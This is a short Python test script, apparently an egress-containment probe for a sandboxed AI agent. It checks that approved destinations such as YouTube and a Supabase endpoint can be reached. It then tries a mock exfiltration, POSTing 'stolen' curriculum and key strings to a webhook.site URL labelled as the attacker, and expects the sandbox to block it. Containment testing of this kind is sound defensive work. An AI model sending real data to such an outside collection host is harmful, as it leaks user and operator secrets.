"""Agent-native containment proof.

Mirrors 8kEdu's real egress pattern (the sinks agent/tools.py + agent/db.py use) and
then attempts a rogue exfil. Run INSIDE the scoutclaw sandbox: the allowed sinks
connect, the exfil is refused by OpenShell's egress proxy — same code, contained.

  nemoclaw scoutclaw upload claw-agent/agent_egress_probe.py /sandbox/
  nemoclaw scoutclaw exec -- python3 /sandbox/agent_egress_probe.py
"""
import urllib.request
import urllib.error

SINKS = [
    ("FIND_VIDEO  → youtube", "https://www.youtube.com/", "GET", True),
    ("PERSIST     → supabase", "https://cfyelmzuuwqadnwxcxkv.supabase.co/rest/v1/", "GET", True),
    ("EXFIL       → attacker", "https://webhook.site/8kedu-exfil", "POST", False),
]


def hit(url, method):
    data = b"curriculum=stolen&key=leaked" if method == "POST" else None
    req = urllib.request.Request(url, data=data, method=method)
    try:
        with urllib.request.urlopen(req, timeout=12) as r:
            return f"HTTP {r.status}"
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}"            # reached host, app-level status (e.g. 401)
    except Exception as e:                  # egress proxy refused the connection
        return f"BLOCKED ({type(e).__name__})"


print("8kEdu agent egress — under OpenShell policy\n")
ok = True
for label, url, method, should_allow in SINKS:
    res = hit(url, method)
    reached = not res.startswith("BLOCKED")
    verdict = "✅" if reached == should_allow else "❌ POLICY LEAK"
    if reached != should_allow:
        ok = False
    tag = "allowed" if should_allow else "must be blocked"
    print(f"  {label:24} [{tag:15}] → {res:22} {verdict}")

print("\n" + ("CONTAINED — capable agent, zero unauthorized egress." if ok
             else "FAIL — policy did not hold."))
raise SystemExit(0 if ok else 1)
